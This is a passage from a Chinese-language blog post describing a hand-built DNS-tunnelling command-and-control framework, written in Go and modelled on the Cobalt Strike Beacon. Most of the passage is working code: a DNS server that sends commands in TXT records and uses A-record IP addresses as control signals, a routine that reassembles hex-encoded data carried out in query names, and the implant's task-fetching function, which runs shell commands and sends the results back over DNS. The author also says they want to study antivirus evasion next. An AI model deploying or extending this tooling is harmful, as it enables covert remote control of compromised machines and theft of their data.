<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/21/11-18-48-22adeeba5f2ffa8bdb96d3d27273a3f8-20250921111848-bc60c6.png"></p>
<p>循环的尾部就是执行DNS查询，见下图</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/22/19-37-37-cc35475e3ddf3ead96ea21b0c589d557-20250922193737-212564.png"></p>
<h3 id="（二）解析回传数据-server"><a href="#（二）解析回传数据-server" class="headerlink" title="（二）解析回传数据-server"></a>（二）解析回传数据-server</h3><p>函数调用链如下，实际也是我编写代码的顺序</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ListenerStart</span><br><span class="line">	-&gt;processRequest</span><br><span class="line">		-&gt;handleA</span><br><span class="line">			-&gt;CallbackDataHandler</span><br><span class="line">	-&gt;processResponse</span><br></pre></td></tr></table></figure>

<p>先用 <code>ListenerStart</code> 启动DNS监听器。<code>processRequest</code> 处理所有类型的DNS查询，而 <code>processResponse</code> 将我们精心构造的DNS响应报文返回给Beacon。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ListenerStart</span><span class="params">(addr <span class="type">string</span>)</span></span> <span class="type">error</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 注册DNS查询处理函数，所有查询（无论查询名是什么）都会进入这个闭包函数处理。  </span></span><br><span class="line">    dns.HandleFunc(<span class="string">&quot;.&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(w dns.ResponseWriter, r *dns.Msg)</span></span> &#123;  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// 创建一个空白的dns报文并把请求头复制进去，保证ID、QR、RD等标志位符合规范。  </span></span><br><span class="line">       reply := <span class="built_in">new</span>(dns.Msg)  </span><br><span class="line">       reply.SetReply(r)  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// 只关心第一条Question，忽略其余。  </span></span><br><span class="line">       <span class="keyword">if</span> <span class="built_in">len</span>(r.Question) &gt; <span class="number">0</span> &#123;  </span><br><span class="line">  </span><br><span class="line">          <span class="comment">// 由processRequest处理任务获取请求，并生成应答  </span></span><br><span class="line">          q := r.Question[<span class="number">0</span>]  </span><br><span class="line">          rrs := processRequest(q.Name, q.Qtype)  </span><br><span class="line">          reply.Answer = rrs  </span><br><span class="line">  </span><br><span class="line">       &#125;  </span><br><span class="line">       processResponse(w, reply)  </span><br><span class="line">    &#125;)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 启动dns服务器监听  </span></span><br><span class="line">    server := &amp;dns.Server&#123;Addr: addr, Net: <span class="string">&quot;udp&quot;</span>&#125;  </span><br><span class="line">    log.Println(<span class="string">&quot;[ListenerStart] listening on&quot;</span>, addr)  </span><br><span class="line">    <span class="keyword">return</span> server.ListenAndServe()  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>processRequest</code>：说是处理所有类型，实际我们只用处理 <code>A</code> 和 <code>TXT</code> 记录查询请求。</p>
<ol>
<li>对于查询类型为 <code>TXT</code> 的，我们将Txt字段赋值命令数据。</li>
<li>对于查询类型为 <code>A</code> 的，我们返回A字段赋值IPv4地址，Ipv4地址的最后一个字节可以从当控制信号。</li>
</ol>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">processRequest</span><span class="params">(qName <span class="type">string</span>, qType <span class="type">uint16</span>)</span></span> []dns.RR &#123;  </span><br><span class="line">    name := strings.ToLower(qName)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">switch</span> qType &#123;  </span><br><span class="line">    <span class="keyword">case</span> dns.TypeTXT:  </span><br><span class="line">       <span class="keyword">return</span> []dns.RR&#123;  </span><br><span class="line">          &amp;dns.TXT&#123;  </span><br><span class="line">             Hdr: dns.RR_Header&#123;  </span><br><span class="line">                Name:   name,  </span><br><span class="line">                Rrtype: dns.TypeTXT,  </span><br><span class="line">                Class:  dns.ClassINET,  </span><br><span class="line">                Ttl:    <span class="number">30</span>,  </span><br><span class="line">             &#125;,  </span><br><span class="line">             Txt: []<span class="type">string</span>&#123;currCmd&#125;,  </span><br><span class="line">          &#125;,  </span><br><span class="line">       &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">case</span> dns.TypeA:  </span><br><span class="line">       ip := handleA(name)  </span><br><span class="line">       <span class="keyword">return</span> []dns.RR&#123;  </span><br><span class="line">          &amp;dns.A&#123;  </span><br><span class="line">             Hdr: dns.RR_Header&#123;  </span><br><span class="line">                Name:   name,  </span><br><span class="line">                Rrtype: dns.TypeA,  </span><br><span class="line">                Class:  dns.ClassINET,  </span><br><span class="line">                Ttl:    <span class="number">30</span>,  </span><br><span class="line">             &#125;,  </span><br><span class="line">             A: ip,  </span><br><span class="line">          &#125;,  </span><br><span class="line">       &#125;  </span><br><span class="line">    <span class="keyword">default</span>:  </span><br><span class="line">       <span class="keyword">return</span> <span class="literal">nil</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>handleA</code> 对于 “www”和”post” 前缀，会进一步调用 <code>CallbackDataHandler</code> 处理回传的数据，而对于“api”前缀，我只返回一个ip作为控制信号，<code>192.168.1.2</code> 的最后一个字节 <code>2</code> 表示要执行 <code>shell</code> 命令。还是那句话我对于这里的控制信号不是很满意，后续有机会还会改进，甚至放弃控制信号。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handleA</span><span class="params">(name <span class="type">string</span>)</span></span> net.IP &#123;  </span><br><span class="line">    <span class="keyword">var</span> ip net.IP  </span><br><span class="line">    fmt.Printf(<span class="string">&quot;[handleA] %s\n&quot;</span>, name)  </span><br><span class="line">    parts := strings.Split(strings.TrimSuffix(name, <span class="string">&quot;.&quot;</span>), <span class="string">&quot;.&quot;</span>)  </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(parts) &lt; <span class="number">2</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> net.IPv4(<span class="number">192</span>, <span class="number">168</span>, <span class="number">1</span>, <span class="number">1</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">switch</span> parts[<span class="number">0</span>] &#123;  </span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;www&quot;</span>, <span class="string">&quot;post&quot;</span>:  </span><br><span class="line">       ip = CallbackDataHandler(parts)  </span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;api&quot;</span>:  </span><br><span class="line">       ip = net.IPv4(<span class="number">192</span>, <span class="number">168</span>, <span class="number">1</span>, <span class="number">2</span>)  </span><br><span class="line">    <span class="keyword">default</span>:  </span><br><span class="line">       ip = net.IPv4(<span class="number">192</span>, <span class="number">168</span>, <span class="number">1</span>, <span class="number">2</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> ip  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 全局只读 map，写操作仅发生在首次收 length 时，之后只读  </span></span><br><span class="line"><span class="keyword">var</span> wwwNoLock = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]*wwwSession)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">type</span> wwwSession <span class="keyword">struct</span> &#123;  </span><br><span class="line">    Length <span class="type">int</span>  </span><br><span class="line">    Data   <span class="keyword">map</span>[<span class="type">int</span>][]<span class="type">byte</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>接下来就是调用 <code>CallbackDataHandler</code> 把客户端通过DNS查询名偷偷带进来的二进制片段重新拼成完整文件。</p>
<p>首先再来看长度和数据域名的格式，方便理解我后续的描述： </p>
<ul>
<li>长度：<code>www.&lt;lablecount&gt;.&lt;长度&gt;.&lt;reqno+nonce&gt;.&lt;agentid&gt;.&lt;domain&gt;</code></li>
<li>数据：<code>www.&lt;lablecount&gt;.&lt;hex-seg-1&gt;.&lt;hex-seg-2&gt;...&lt;hex-seg-N&gt;.&lt;reqno+nonce&gt;.&lt;agentid&gt;.&lt;domain&gt;</code></li>
</ul>
<p>根据Beacon与Server双方对于域名的约定，提取<strong>reqno</strong>与<strong>nonce</strong>。reqno &#x3D;&#x3D; 0 → <strong>首包</strong>，里面放的是“总长度”。reqno &gt; 0 → <strong>数据包</strong>，里面放的是“序号+数据”，reqno从1开始就从当wwwSession.Data的键，单个域名解析得到的数据存放在以reqno为键的map里，这是为了方便后续还原原始数据。</p>
<p>接着获取 <code>lablecount</code>，它的用处表明 <code>lablecount</code> 字段后面的数据用了多少个标签，然后将分散的hex格式的数据拼接起来还原成字节数据。</p>
<p>最后是收齐拼装，当已收字节数 ≥ 首包声明的总长度，即 <code>got &gt;= s.Length</code> 时，服务端把<strong>相同 nonce</strong> 的片段按 <strong>reqno 升序</strong>拼在一起并用返回IP <code>192.168.1.253</code> 告诉客户端“收工”，其实这个控制信号也没用到&#x3D;。&#x3D;。</p>
<p>⚠注意：我并未使用到 <code>agentid</code> 字段，如果涉及多Beacon上线，为了区分不同，不同Beacon发送的数据，一定要用到 <code>agentid</code> 字段，具体怎么改又是值得思考的问题……</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 全局只读 map，写操作仅发生在首次收 length 时，之后只读  </span></span><br><span class="line"><span class="keyword">var</span> wwwNoLock = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]*wwwSession)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">type</span> wwwSession <span class="keyword">struct</span> &#123;  </span><br><span class="line">    Length <span class="type">int</span>  </span><br><span class="line">    Data   <span class="keyword">map</span>[<span class="type">int</span>][]<span class="type">byte</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">/* ---------- 无锁拼装 ---------- */</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">CallbackDataHandler</span><span class="params">(parts []<span class="type">string</span>)</span></span> net.IP &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">var</span> (  </span><br><span class="line">       reqno <span class="type">int64</span>  </span><br><span class="line">       err   <span class="type">error</span>  </span><br><span class="line">    )  </span><br><span class="line">  </span><br><span class="line">	<span class="comment">// 比如www.1.len.0nonce.agentid.domain 长度包  </span></span><br><span class="line">	<span class="comment">// 比如www.1.data.0nonce.agentid.domain 数据包  </span></span><br><span class="line">    n := <span class="built_in">len</span>(parts)  </span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">6</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> net.IPv4(<span class="number">192</span>, <span class="number">168</span>, <span class="number">1</span>, <span class="number">1</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 获取nonceField  </span></span><br><span class="line">    nonceField := parts[n<span class="number">-5</span>]  </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(nonceField) &lt; <span class="number">9</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> net.IPv4(<span class="number">192</span>, <span class="number">168</span>, <span class="number">1</span>, <span class="number">1</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 获取reqno  </span></span><br><span class="line">    reqstr := nonceField[:<span class="number">2</span>]  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> reqstr[<span class="number">0</span>] == <span class="string">&#x27;0&#x27;</span> &amp;&amp; <span class="built_in">len</span>(reqstr) &gt; <span class="number">1</span> &#123;  </span><br><span class="line">       reqno, err = strconv.ParseInt(reqstr[<span class="number">1</span>:<span class="number">2</span>], <span class="number">16</span>, <span class="number">32</span>)  </span><br><span class="line">       <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">          <span class="keyword">return</span> net.IPv4(<span class="number">192</span>, <span class="number">168</span>, <span class="number">1</span>, <span class="number">1</span>)  </span><br><span class="line">       &#125;  </span><br><span class="line">  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">       reqno, err = strconv.ParseInt(reqstr, <span class="number">16</span>, <span class="number">32</span>)  </span><br><span class="line">       <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">          <span class="keyword">return</span> net.IPv4(<span class="number">192</span>, <span class="number">168</span>, <span class="number">1</span>, <span class="number">1</span>)  </span><br><span class="line">       &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    nonce := nonceField[<span class="number">2</span>:<span class="number">10</span>]  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 首次包：创建会话，一次性写入map，之后只读  </span></span><br><span class="line">    <span class="keyword">if</span> reqno == <span class="number">0</span> &#123;  </span><br><span class="line">       length, err := strconv.ParseInt(parts[<span class="number">2</span>], <span class="number">16</span>, <span class="number">32</span>)  </span><br><span class="line">       <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">          <span class="keyword">return</span> net.IPv4(<span class="number">192</span>, <span class="number">168</span>, <span class="number">1</span>, <span class="number">1</span>)  </span><br><span class="line">       &#125;  </span><br><span class="line">       <span class="comment">// 唯一一次写操作，发生在流最开始，并发冲突概率极低  </span></span><br><span class="line">       wwwNoLock[nonce] = &amp;wwwSession&#123;  </span><br><span class="line">          Length: <span class="type">int</span>(length),  </span><br><span class="line">          Data:   <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">int</span>][]<span class="type">byte</span>),  </span><br><span class="line">       &#125;  </span><br><span class="line">       log.Printf(<span class="string">&quot;[CallbackDataHandler] new session nonce=%s len=%d\n&quot;</span>, nonce, length)  </span><br><span class="line">       <span class="keyword">return</span> net.IPv4(<span class="number">192</span>, <span class="number">168</span>, <span class="number">1</span>, <span class="number">1</span>)  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">       <span class="comment">// 数据片：无锁读  </span></span><br><span class="line">       s, ok := wwwNoLock[nonce]  </span><br><span class="line">       <span class="keyword">if</span> !ok &#123;  </span><br><span class="line">          <span class="keyword">return</span> net.IPv4(<span class="number">192</span>, <span class="number">168</span>, <span class="number">1</span>, <span class="number">1</span>)  </span><br><span class="line">       &#125;  </span><br><span class="line">  </span><br><span class="line">       lablecount, err := strconv.Atoi(parts[<span class="number">1</span>])  </span><br><span class="line">       <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">          <span class="keyword">return</span> net.IPv4(<span class="number">192</span>, <span class="number">168</span>, <span class="number">1</span>, <span class="number">1</span>)  </span><br><span class="line">       &#125;  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// 拼 hex       </span></span><br><span class="line">       hexStr := strings.Join(parts[<span class="number">2</span>:<span class="number">2</span>+lablecount], <span class="string">&quot;&quot;</span>)  </span><br><span class="line">       raw, err := hex.DecodeString(hexStr)  </span><br><span class="line">       <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">          <span class="keyword">return</span> net.IPv4(<span class="number">192</span>, <span class="number">168</span>, <span class="number">1</span>, <span class="number">1</span>)  </span><br><span class="line">       &#125;  </span><br><span class="line">       s.Data[<span class="type">int</span>(reqno)] = raw  </span><br><span class="line">       <span class="built_in">println</span>(reqno)  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// 收齐检查  </span></span><br><span class="line">       got := <span class="number">0</span>  </span><br><span class="line">       <span class="keyword">for</span> _, v := <span class="keyword">range</span> s.Data &#123;  </span><br><span class="line">          got += <span class="built_in">len</span>(v)  </span><br><span class="line">       &#125;  </span><br><span class="line">       <span class="built_in">println</span>(got)  </span><br><span class="line">       <span class="keyword">if</span> got &gt;= s.Length &#123;  </span><br><span class="line">          keys := <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">0</span>, <span class="built_in">len</span>(s.Data))  </span><br><span class="line">          <span class="keyword">for</span> k := <span class="keyword">range</span> s.Data &#123;  </span><br><span class="line">             keys = <span class="built_in">append</span>(keys, k)  </span><br><span class="line">          &#125;  </span><br><span class="line">          sort.Ints(keys)  </span><br><span class="line">  </span><br><span class="line">          full := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">0</span>, s.Length)  </span><br><span class="line">          <span class="keyword">for</span> _, k := <span class="keyword">range</span> keys &#123;  </span><br><span class="line">             full = <span class="built_in">append</span>(full, s.Data[k]...)  </span><br><span class="line">          &#125;  </span><br><span class="line">          full = full[:s.Length] <span class="comment">// 精确截断  </span></span><br><span class="line">  </span><br><span class="line">          log.Printf(<span class="string">&quot;[CallbackDataHandler] session %s finished (%d bytes):\n%s\n&quot;</span>, nonce, s.Length, <span class="type">string</span>(full))  </span><br><span class="line">          <span class="built_in">delete</span>(wwwNoLock, nonce)  </span><br><span class="line">       &#125;  </span><br><span class="line">  </span><br><span class="line">       <span class="keyword">return</span> net.IPv4(<span class="number">192</span>, <span class="number">168</span>, <span class="number">1</span>, <span class="number">253</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>processResponse</code>把消息写回客户端</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">processResponse</span><span class="params">(w dns.ResponseWriter, msg *dns.Msg)</span></span> &#123;  </span><br><span class="line">    <span class="keyword">defer</span> w.Close()  </span><br><span class="line">    <span class="keyword">if</span> err := w.WriteMsg(msg); err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       log.Println(<span class="string">&quot;[processResponse] write error:&quot;</span>, err)  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实际上在到这里Server的代码就编写完成了，代码肯定还有补充和优化的地方，只是时间有限我就不改了。</p>
<h3 id="（三）获取任务、执行任务、回传结果-Beacon"><a href="#（三）获取任务、执行任务、回传结果-Beacon" class="headerlink" title="（三）获取任务、执行任务、回传结果-Beacon"></a>（三）获取任务、执行任务、回传结果-Beacon</h3><p>先看主循环里的内容（见下图），代码非常简单：用 <code>DNSGet_TXT</code> 获取控制信号和任务数据，根据控制信号走到不同的处理分支（本文就一个分支），最后将任务数据以post作为前缀的域名调用 <code>DNSPut</code> 将结果回传给服务器。</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/22/20-57-22-0b20f3eeefa0b6152db1565e499fbfae-20250922205721-423418.png"></p>
<p>代码中执行cmd命令获取执行结果作为回传数据，其实也没有什么好讲的，然后<code>DNSPut</code> 上文已经介绍过了，下面重点介绍 <code>DNSGet_TXT</code></p>
<p><strong>第一</strong>：通过以api作为前缀，格式化查询域名的每一个标签获得 <code>c2domain</code>，调用 <code>channelLookupRetry_A</code> 获取控制信号。我这边的控制信号与CS是不同的，我是想将信号值 <code>1~255</code> 都用上，在实际设计的时候没有考虑到多任务同时下发给beacon，导致beacon每次只能获取一个任务。</p>
<p><strong>第二</strong>：发<strong>TXT查询</strong>拿真正的任务数据，把应答里所有TXT段的字符串顺序拼接，单txt段 ≤ 255B，一个 <code>TXT</code> 响应报文可以放置多个txt段，由于本文设置4096B的最大UDPSize，所以<strong>一条TXT响应报文</strong>只能携带最多4KB的数据，大文件传输还需要实现分片与组装（真的很烦）。</p>
<p>其实除了分片还有一个尚未解决的问题（代码中未实现）：当Beacon想一次获取多个任务，还用控制信号来区分不同命令是不合理的，因为一个a记录查询之后要紧接着txt记录查询，不然控制信号与任务数据不对应。我能想到的解决方案是不使用控制信号（不发a记录查询），而是将命令类型（commandid）与任务数据同时放在在txt包里。</p>
<p>还有一点server和beacon传输的数据都是未加密的，如果想加密数据的师傅可以自行实现。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">DNSGet_TXT</span><span class="params">(typeStr, domain, server <span class="type">string</span>)</span></span> (<span class="type">uint8</span>, []<span class="type">byte</span>) &#123;  </span><br><span class="line">    reqno := <span class="number">0</span>  </span><br><span class="line">    <span class="keyword">var</span> (  </span><br><span class="line">       c2domain <span class="type">string</span>  </span><br><span class="line">       signal   <span class="type">uint8</span>  </span><br><span class="line">    )  </span><br><span class="line">    <span class="comment">// 生成随机nonce  </span></span><br><span class="line">    nonce := rand.Uint32() | (rand.Uint32() &lt;&lt; <span class="number">16</span>)  </span><br><span class="line">    c2domain = fmt.Sprintf(<span class="string">&quot;%s.%x%x.%s&quot;</span>, typeStr, reqno, nonce, domain)  </span><br><span class="line">    signal = channelLookupRetry_A(c2domain, server, <span class="number">100</span>)  </span><br><span class="line">  </span><br><span class="line">    m := <span class="built_in">new</span>(dns.Msg)  </span><br><span class="line">    m.SetQuestion(dns.Fqdn(c2domain), dns.TypeTXT)  </span><br><span class="line">    m.RecursionDesired = <span class="literal">true</span>  </span><br><span class="line">  </span><br><span class="line">    co, err := net.Dial(<span class="string">&quot;udp&quot;</span>, server)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> SIGNAL_DONOTHING, <span class="literal">nil</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">defer</span> co.Close()  </span><br><span class="line">    co.SetDeadline(time.Now().Add(<span class="number">5</span> * time.Second))  </span><br><span class="line">  </span><br><span class="line">    dnsConn := &amp;dns.Conn&#123;Conn: co, UDPSize: <span class="number">4096</span>&#125;  </span><br><span class="line">    <span class="keyword">if</span> err := dnsConn.WriteMsg(m); err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> SIGNAL_DONOTHING, <span class="literal">nil</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">    r, err := dnsConn.ReadMsg()  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> SIGNAL_DONOTHING, <span class="literal">nil</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">var</span> sb strings.Builder  </span><br><span class="line">    <span class="keyword">for</span> _, ans := <span class="keyword">range</span> r.Answer &#123;  </span><br><span class="line">       <span class="keyword">if</span> t, ok := ans.(*dns.TXT); ok &#123;  </span><br><span class="line">          <span class="keyword">for</span> _, s := <span class="keyword">range</span> t.Txt &#123;  </span><br><span class="line">             sb.WriteString(s)  </span><br><span class="line">          &#125;  </span><br><span class="line">       &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> signal, []<span class="type">byte</span>(sb.String())  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我收回开头的那句话，我的dns c2写的真是一坨，食之无味弃之可惜。</p>
<h3 id="（四）实验"><a href="#（四）实验" class="headerlink" title="（四）实验"></a>（四）实验</h3><p>执行代码，只看Server的控制台输出</p>
<p>接收metadata。</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/22/21-28-25-047235c9ae17aea8aee33987767ede21-20250922212825-92da9f.png"></p>
<p>接收回传结果。</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/22/21-32-31-658b72083b072edaa17a43b13ebc296b-20250922213230-5cb3ac.png"></p>
<p>beacon在win10好像不行？不懂哪里出了问题，累了，等哪天有空再说。</p>
<h1 id="五、下一步计划"><a href="#五、下一步计划" class="headerlink" title="五、下一步计划"></a>五、下一步计划</h1><p>说实话C2编程有点玩腻了，编码也不是我的强项，我写的代码真是一坨屎，<strong>所以想研究点二进制相关的内容，特别想研究免杀相关的，那里才是我的舒适区感觉像回到家一样的亲近感，那里的“一砖一瓦”都让人倍感亲切和兴奋</strong>😭。</p>
<p>而且<a target="_blank" rel="noopener" href="https://github.com/kyxiaxiang">可以遐想（kyxiaxiang）</a>大佬公开了CS Beacon的源码，这里面有太多值得研究东西，也不知道各位师傅想看什么内容呐？我的目标永远不是重构Beacon，而是研究其令人叹为观止的技术，其对抗的哲学思想令我着迷。</p>
